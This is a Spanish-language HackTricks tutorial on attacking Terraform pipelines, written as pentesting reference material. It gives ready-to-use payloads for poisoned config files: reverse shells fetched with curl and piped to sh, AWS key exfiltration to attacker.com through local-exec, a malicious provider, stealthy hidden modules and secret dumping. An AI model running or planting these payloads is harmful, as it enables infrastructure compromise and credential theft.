# Seguridad en Terraform

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Información Básica

HashiCorp Terraform es una **herramienta de infraestructura como código** que te permite definir tanto **recursos en la nube como en local** en archivos de configuración legibles por humanos que puedes versionar, reutilizar y compartir. Luego puedes usar un flujo de trabajo consistente para aprovisionar y gestionar toda tu infraestructura a lo largo de su ciclo de vida. Terraform puede gestionar componentes de bajo nivel como recursos de cómputo, almacenamiento y red, así como componentes de alto nivel como entradas de DNS y características de SaaS.

### ¿Cómo funciona Terraform?

Terraform crea y gestiona recursos en plataformas en la nube y otros servicios a través de sus interfaces de programación de aplicaciones (APIs). Los proveedores permiten que Terraform trabaje con prácticamente cualquier plataforma o servicio con una API accesible.

![](<../../.gitbook/assets/image (33).png>)

HashiCorp y la comunidad de Terraform ya han escrito **más de 1700 proveedores** para gestionar miles de diferentes tipos de recursos y servicios, y este número sigue creciendo. Puedes encontrar todos los proveedores públicamente disponibles en el [Registro de Terraform](https://registry.terraform.io/), incluyendo Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog y muchos más.

El flujo de trabajo central de Terraform consta de tres etapas:

* **Escribir:** Definir recursos, que pueden estar en múltiples proveedores de nube y servicios. Por ejemplo, podrías crear una configuración para desplegar una aplicación en máquinas virtuales en una red Virtual Private Cloud (VPC) con grupos de seguridad y un balanceador de carga.
* **Planificar:** Terraform crea un plan de ejecución describiendo la infraestructura que creará, actualizará o destruirá basado en la infraestructura existente y tu configuración.
* **Aplicar:** Con aprobación, Terraform realiza las operaciones propuestas en el orden correcto, respetando cualquier dependencia de recursos. Por ejemplo, si actualizas las propiedades de una VPC y cambias el número de máquinas virtuales en esa VPC, Terraform recreará la VPC antes de escalar las máquinas virtuales.

![](<../../.gitbook/assets/image (81).png>)

### Terraform Enterprise

Terraform Enterprise te permite **ejecutar comandos** como `terraform plan` o `terraform apply` de forma remota en una **versión autoalojada de Terraform Cloud**. Por lo tanto, si encuentras la **clave API** para acceder a ese servidor de Terraform, puedes **comprometerlo**.\
Para más información, consulta:

{% content-ref url="terraform-enterprise-security.md" %}
[terraform-enterprise-security.md](terraform-enterprise-security.md)
{% endcontent-ref %}

## Laboratorio de Terraform

Solo instala terraform en tu computadora.

Aquí tienes una [guía](https://learn.hashicorp.com/tutorials/terraform/install-cli) y aquí la [mejor manera de descargar terraform](https://www.terraform.io/downloads).

## RCE en Terraform

Terraform **no tiene una plataforma que exponga una página web o un servicio de red** que podamos enumerar, por lo tanto, la única forma de comprometer terraform es **poder añadir/modificar archivos de configuración de terraform**.

Sin embargo, terraform es un componente **muy sensible** de comprometer porque tendrá **acceso privilegiado** a diferentes ubicaciones para poder funcionar correctamente.

La principal manera para que un atacante pueda comprometer el sistema donde se ejecuta terraform es **comprometer el repositorio que almacena las configuraciones de terraform**, porque en algún momento van a ser **interpretadas**.

De hecho, hay soluciones que **ejecutan terraform plan/apply automáticamente después de que se crea un PR**, como **Atlantis**:

{% content-ref url="../atlantis-security.md" %}
[atlantis-security.md](../atlantis-security.md)
{% endcontent-ref %}

Si puedes comprometer un archivo de terraform, hay diferentes maneras en las que puedes realizar RCE cuando alguien ejecuta `terraform plan` o `terraform apply`.

### Terraform plan

Terraform plan es el **comando más utilizado** en terraform y los desarrolladores/soluciones que usan terraform lo llaman todo el tiempo, por lo que la **manera más fácil de obtener RCE** es asegurarte de envenenar un archivo de configuración de terraform que ejecutará comandos arbitrarios en un `terraform plan`.

#### Usando un proveedor externo

Terraform ofrece el [`external` provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs) que proporciona una forma de interfaz entre Terraform y programas externos. Puedes usar el origen de datos `external` para ejecutar código arbitrario durante un `plan`.

Inyectar en un archivo de configuración de terraform algo como lo siguiente ejecutará un rev shell al ejecutar `terraform plan`:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Uso de un proveedor personalizado

Cualquiera puede escribir un [proveedor personalizado](https://learn.hashicorp.com/tutorials/terraform/provider-setup) y publicarlo en el [Registro de Terraform](https://registry.terraform.io/). También podrías intentar obtener un proveedor personalizado de un registro privado.

Así es:

* escribe un proveedor personalizado que ejecute algún código malicioso (como exfiltrar credenciales o datos de clientes)
* publícalo en el Registro de Terraform
* añade el proveedor al código de Terraform en una rama de características
* abre un PR para la rama de características
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Dado que el proveedor se incorporará durante el `init` y ejecutará algo de código durante el `plan`, tienes ejecución de código arbitrario.

Puedes encontrar un ejemplo en [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

#### Usando una referencia externa

Ambas opciones mencionadas son útiles pero no muy sigilosas (la segunda es más sigilosa pero más compleja que la primera). Puedes realizar este ataque de una manera **aún más sigilosa**, siguiendo estas sugerencias:

* En lugar de agregar el rev shell directamente en el archivo de terraform, puedes **cargar un recurso externo** que contenga el rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Puede encontrar el código de rev shell en [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules)

* En el recurso externo, utilice la característica **ref** para ocultar el **código de terraform rev shell en una rama** dentro del repositorio, algo así como: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform apply se ejecutará para aplicar todos los cambios, también puede abusar de él para obtener RCE inyectando **un archivo Terraform malicioso con** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Solo necesita asegurarse de que algún payload como los siguientes termine en el archivo `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Sigue las **sugerencias de la técnica anterior** para realizar este ataque de una manera **más sigilosa utilizando referencias externas**.

## Volcado de Secretos

Puedes obtener **valores secretos utilizados por terraform** ejecutando `terraform apply` añadiendo al archivo de terraform algo como:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Herramientas de Auditoría

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec utiliza análisis estático de tu código terraform para detectar posibles malas configuraciones.
* [**terascan**](https://github.com/tenable/terrascan): Terrascan es un analizador de código estático para Infraestructura como Código.

## Referencias

* [Seguridad de Atlantis](../atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
